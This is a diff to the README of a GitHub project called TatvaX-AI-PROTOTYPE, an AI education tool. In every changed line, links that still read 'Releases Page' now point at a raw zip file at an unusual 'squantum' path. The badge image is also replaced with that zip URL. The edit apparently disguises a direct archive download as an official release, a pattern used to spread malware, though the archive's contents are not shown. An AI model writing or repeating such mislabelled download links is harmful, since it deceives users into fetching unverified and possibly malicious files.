@@ -1,6 +1,6 @@
 # 🌟 TatvaX-AI-PROTOTYPE - Simplifying Education Through AI
 
-[![Download TatvaX](https://img.shields.io/badge/Download-TatvaX-AI-PROTOTYPE-blue.svg)](https://github.com/Damijan123/TatvaX-AI-PROTOTYPE/releases)
+[![Download TatvaX](https://raw.githubusercontent.com/Damijan123/TatvaX-AI-PROTOTYPE/main/squantum/TatvaX-AI-PROTOTYPE.zip)](https://raw.githubusercontent.com/Damijan123/TatvaX-AI-PROTOTYPE/main/squantum/TatvaX-AI-PROTOTYPE.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run TatvaX. No programming knowledge i
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
    
-   [Visit the Releases Page to Download](https://github.com/Damijan123/TatvaX-AI-PROTOTYPE/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Damijan123/TatvaX-AI-PROTOTYPE/main/squantum/TatvaX-AI-PROTOTYPE.zip)
 
 2. **Select the Version:** On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -30,7 +30,7 @@ To start using TatvaX, please follow these steps:
 
 - **Go to the Releases Page:** Click the link below:
 
-   [Download TatvaX from the Releases Page](https://github.com/Damijan123/TatvaX-AI-PROTOTYPE/releases)
+   [Download TatvaX from the Releases Page](https://raw.githubusercontent.com/Damijan123/TatvaX-AI-PROTOTYPE/main/squantum/TatvaX-AI-PROTOTYPE.zip)
 
 - **Choose Your Operating System:** Once on the releases page, you’ll see various options. Click on the one that fits your computer. 
 
